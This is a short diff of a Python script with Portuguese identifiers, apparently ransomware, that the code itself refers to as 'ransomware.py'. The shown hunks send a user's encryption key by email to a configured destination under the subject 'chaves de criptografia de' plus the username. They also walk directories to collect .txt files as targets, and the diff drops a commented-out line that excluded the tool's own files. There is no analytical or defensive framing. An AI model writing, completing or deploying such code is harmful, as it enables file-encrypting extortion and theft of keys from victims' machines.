@@ -16,7 +16,7 @@ def enviar_email():
     usuario = getpass.getuser()
     if chave:
         msg = MIMEText(chave.decode("utf-8"))
-        msg['SUBJECT'] = "teste email de " + usuario
+        msg['SUBJECT'] = "chaves de criptografia de " + usuario
         msg['From'] = EMAIL_ORIGEM
         msg['To'] = EMAIL_DESTINO
 
@@ -54,7 +54,6 @@ def encontrar_arquivos(diretorio):
     for raiz, _, arquivos in os.walk(diretorio):
         for nome in arquivos:
             caminho = os.path.join(raiz, nome)
-            #if nome != "ransomware.py" and nome != "descriptografar.py" and not nome.endswith(".key"):
             if nome.endswith(".txt"):
                 lista.append(caminho)
     return lista
@@ -87,4 +86,5 @@ def main():
 
 
 if __name__ == "__main__":
+
     main()
